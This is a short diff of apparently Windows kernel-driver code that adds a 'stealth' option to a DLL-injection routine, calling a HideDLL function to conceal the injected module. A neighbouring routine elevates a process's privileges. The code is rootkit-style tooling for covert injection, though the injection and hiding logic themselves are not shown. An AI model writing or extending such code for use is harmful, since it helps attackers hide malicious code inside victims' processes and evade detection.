@@ -413,8 +413,7 @@ int ProcessUtils::ElevateProcess(UINT32 PID) {
         return status;
 }
 
-// NOTE: THIS DOESNT WORK AS NtCreateThreadEx is NOT EXPORTED BY NTOSKRNL, SO MmGetSystemRoutineAddress fails. -- Find the function in SSDT, for now APC will be implemented.
-int ProcessUtils::InjectDLL(WCHAR* path, UINT32 PID /*, bool stealth */) {
+int ProcessUtils::InjectDLL(WCHAR* path, UINT32 PID, bool stealth) {
     // its 1am btw, no explanations unless edited on by future me :)
     // since we are using LABELS and GOTO this time, we must init all variables before calling the goto keyword, idk why.
     if (PID < 4) {
@@ -600,6 +599,14 @@ int ProcessUtils::InjectDLL(WCHAR* path, UINT32 PID /*, bool stealth */) {
     if (failure) {
         DbgPrint("[-] Failure on InjectDLL\n");
         return STATUS_UNSUCCESSFUL;
+    }
+    
+    if (stealth) {
+        DbgPrint("[+] Stealth boolean is enabled, calling HideDLL.");
+        WCHAR* filename = ExtractFileName(path);
+        HideDLL(PID, filename);
+        DbgPrint("[+] Finished with InjectDLL, returning.\n");
+        return STATUS_SUCCESS_WITH_STEALTH;
     }
 
     DbgPrint("[+] Finished with InjectDLL, returning.\n");
